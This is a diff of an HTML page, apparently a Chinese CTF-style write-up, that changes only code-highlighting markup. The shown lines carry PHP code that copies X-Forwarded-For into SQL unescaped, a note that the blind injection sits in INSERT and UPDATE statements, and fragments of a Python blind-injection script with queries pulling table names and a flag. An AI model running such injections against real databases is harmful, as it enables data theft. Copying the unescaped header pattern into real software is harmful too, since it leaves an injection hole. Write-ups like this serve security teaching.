@@ -67,14 +67,13 @@
 
 <p>某开源系统中</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>$this-&gt;ip = mysqli_real_escape_string($mysqli,$_SERVER['REMOTE_ADDR']);
-if( !empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ){
-    $REMOTE_ADDR = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    $tmp_ip=explode(',',$REMOTE_ADDR);
-    $this-&gt;ip = $tmp_ip[0];
-}
-</code></pre>
-</div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]);</span>
+<span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">]</span> <span class="p">)</span> <span class="p">){</span>
+    <span class="nv">$REMOTE_ADDR</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">];</span>
+    <span class="nv">$tmp_ip</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span><span class="nv">$REMOTE_ADDR</span><span class="p">);</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span> <span class="nv">$tmp_ip</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+</code></pre></div></div>
 
 <p>然后注入点在insert和update语句中。一个盲注场景，没有报错和回显。</p>
 
@@ -92,7 +91,7 @@ if( !empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ){
 
 <p>最终实现的代码是</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c"># coding=utf-8</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># coding=utf-8</span>
 <span class="kn">import</span> <span class="nn">time</span>
 <span class="kn">import</span> <span class="nn">requests</span>
 
@@ -124,8 +123,7 @@ if( !empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ){
 <span class="c">#get_info("(select column_name from information_schema.columns where table_name='flag' and table_schema='ip_db' limit 1)")</span>
 <span class="c">#get_info("(select flag from ip_db.flag limit 1)")</span>
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 
 
